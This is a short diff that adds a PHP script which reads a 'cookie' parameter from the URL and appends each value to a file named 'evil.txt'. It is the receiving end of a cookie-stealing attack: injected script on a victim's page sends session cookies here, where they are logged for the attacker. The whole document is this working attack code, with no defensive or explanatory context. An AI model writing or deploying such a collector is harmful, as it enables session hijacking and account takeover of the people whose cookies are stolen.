@@ -1,0 +1,6 @@
+<?php
+$cookie=$_GET['cookie'] . "\n";
+$fh=fopen('evil.txt','ab');
+fwrite($fh,$cookie);
+fclose($fh);
+?>
